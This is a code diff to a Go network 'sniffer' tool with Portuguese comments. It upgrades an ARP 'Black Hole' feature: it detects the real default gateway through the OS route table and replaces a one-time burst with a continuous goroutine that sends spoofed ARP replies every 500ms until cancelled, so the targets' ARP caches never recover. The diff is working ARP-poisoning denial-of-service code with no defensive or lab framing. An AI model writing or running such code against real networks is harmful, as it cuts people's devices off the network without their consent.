@@ -1,6 +1,7 @@
 package sniffer
 
 import (
+	"context"
 	"fmt"
 	"net"
 	"os"
@@ -318,10 +319,64 @@ func (s *SnifferService) SendARPRestore(handle *pcap.Handle, myMAC net.HardwareA
 	_ = s.sendARPReply(handle, myMAC, gatewayIP, targetMAC, targetIP)
 }
 
+// resolveDefaultGateway consulta a tabela de rotas do SO para descobrir o gateway padrão real.
+// Funciona em Windows (via PowerShell) e Linux (via ip route).
+// Retorna nil se não conseguir detectar, permitindo fallback pelo chamador.
+func resolveDefaultGateway() net.IP {
+	if runtime.GOOS == "windows" {
+		cmd := exec.Command("powershell", "-Command",
+			"(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Select-Object -First 1).NextHop")
+		output, err := cmd.Output()
+		if err == nil {
+			ip := net.ParseIP(strings.TrimSpace(string(output)))
+			if ip != nil {
+				return ip
+			}
+		}
+	} else {
+		cmd := exec.Command("ip", "route", "show", "default")
+		output, err := cmd.Output()
+		if err == nil {
+			fields := strings.Fields(string(output))
+			for i, f := range fields {
+				if f == "via" && i+1 < len(fields) {
+					ip := net.ParseIP(fields[i+1])
+					if ip != nil {
+						return ip
+					}
+				}
+			}
+		}
+	}
+	return nil
+}
+
+// gatewayIPFromCIDROrOS descobre o IP do gateway: primeiro tenta via tabela de rotas do SO,
+// e se falhar, faz fallback para o primeiro IP da sub-rede (.1).
+func gatewayIPFromCIDROrOS(cidr string) net.IP {
+	// Tenta via SO primeiro (mais confiável)
+	if gw := resolveDefaultGateway(); gw != nil {
+		fmt.Printf("  [*] Gateway detectado via tabela de rotas do SO: %s\n", gw.String())
+		return gw
+	}
+
+	// Fallback: assume .1 da sub-rede
+	_, ipNet, err := net.ParseCIDR(cidr)
+	if err != nil {
+		return nil
+	}
+	gatewayIP := make(net.IP, len(ipNet.IP))
+	copy(gatewayIP, ipNet.IP)
+	gatewayIP[len(gatewayIP)-1] = 1
+	fmt.Printf("  [!] Gateway não detectado via SO, usando fallback: %s\n", gatewayIP.String())
+	return gatewayIP
+}
+
 // ActivateBlackHole ativa o bloqueio total de rede para os IPs fornecidos.
-// Abre um handle pcap temporário, descobre a interface/gateway, resolve os MACs dos alvos,
-// e envia uma rajada de ARPs Black Hole apontando o gateway para de:ad:be:ef:00:01.
-func (s *SnifferService) ActivateBlackHole(targetIPs []string) {
+// Recebe um contexto para controlar o loop contínuo de envenenamento ARP.
+// O loop envia ARPs Black Hole a cada 500ms até o contexto ser cancelado,
+// garantindo que o cache ARP do alvo nunca se recupere.
+func (s *SnifferService) ActivateBlackHole(ctx context.Context, targetIPs []string) {
 	deviceName, deviceIP := s.findActiveInterface()
 	if deviceName == "" {
 		fmt.Printf("  [-] Erro: não foi possível encontrar interface ativa para Black Hole.\n")
@@ -334,22 +389,25 @@ func (s *SnifferService) ActivateBlackHole(targetIPs []string) {
 		return
 	}
 
-	// Descobre o Gateway
-	_, ipNet, err := net.ParseCIDR(cidr)
-	if err != nil {
-		fmt.Printf("  [-] Erro ao parsear CIDR: %v\n", err)
+	// Descobre o Gateway via tabela de rotas do SO
+	gatewayIP := gatewayIPFromCIDROrOS(cidr)
+	if gatewayIP == nil {
+		fmt.Printf("  [-] Erro: não foi possível determinar o gateway.\n")
 		return
 	}
-	gatewayIP := make(net.IP, len(ipNet.IP))
-	copy(gatewayIP, ipNet.IP)
-	gatewayIP[len(gatewayIP)-1] = 1
 
 	handle, err := pcap.OpenLive(deviceName, 1600, true, 100*time.Millisecond)
 	if err != nil {
 		fmt.Printf("  [-] Erro ao abrir handle para Black Hole: %v\n", err)
 		return
 	}
-	defer handle.Close()
+
+	// Resolve MACs dos alvos
+	type targetInfo struct {
+		ip  string
+		mac net.HardwareAddr
+	}
+	var targets []targetInfo
 
 	for _, ip := range targetIPs {
 		targetMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), net.ParseIP(ip))
@@ -367,14 +425,38 @@ func (s *SnifferService) ActivateBlackHole(targetIPs []string) {
 			fmt.Printf("  [-] Não foi possível resolver MAC de %s para Black Hole.\n", ip)
 			continue
 		}
+		targets = append(targets, targetInfo{ip, targetMAC})
+	}
 
-		// Envia rajada de 15 ARPs Black Hole para envenenar o cache do alvo
+	if len(targets) == 0 {
+		handle.Close()
+		return
+	}
+
+	// Rajada inicial para envenenar o cache imediatamente
+	for _, t := range targets {
 		for i := 0; i < 15; i++ {
-			_ = s.SendARPBlackhole(handle, targetMAC, net.ParseIP(ip), gatewayIP)
+			_ = s.SendARPBlackhole(handle, t.mac, net.ParseIP(t.ip), gatewayIP)
 			time.Sleep(30 * time.Millisecond)
 		}
-		fmt.Printf("  [🛑] Black Hole ativado para %s (MAC: %s)\n", ip, targetMAC.String())
+		fmt.Printf("  [🛑] Black Hole ativado para %s (MAC: %s)\n", t.ip, t.mac.String())
 	}
+
+	// Loop contínuo de envenenamento — mantém o bloqueio ativo até o contexto ser cancelado
+	go func() {
+		defer handle.Close()
+		for {
+			select {
+			case <-ctx.Done():
+				return
+			default:
+				for _, t := range targets {
+					_ = s.SendARPBlackhole(handle, t.mac, net.ParseIP(t.ip), gatewayIP)
+				}
+				time.Sleep(500 * time.Millisecond)
+			}
+		}
+	}()
 }
 
 // DeactivateBlackHole desativa o bloqueio total, restaurando o ARP do gateway apontando para nosso MAC.
@@ -390,13 +472,10 @@ func (s *SnifferService) DeactivateBlackHole(targetIPs []string) {
 		return
 	}
 
-	_, ipNet, err := net.ParseCIDR(cidr)
-	if err != nil {
+	gatewayIP := gatewayIPFromCIDROrOS(cidr)
+	if gatewayIP == nil {
 		return
 	}
-	gatewayIP := make(net.IP, len(ipNet.IP))
-	copy(gatewayIP, ipNet.IP)
-	gatewayIP[len(gatewayIP)-1] = 1
 
 	gatewayMAC := s.resolveGatewayMAC(deviceName, myMAC, net.ParseIP(deviceIP), gatewayIP)
 
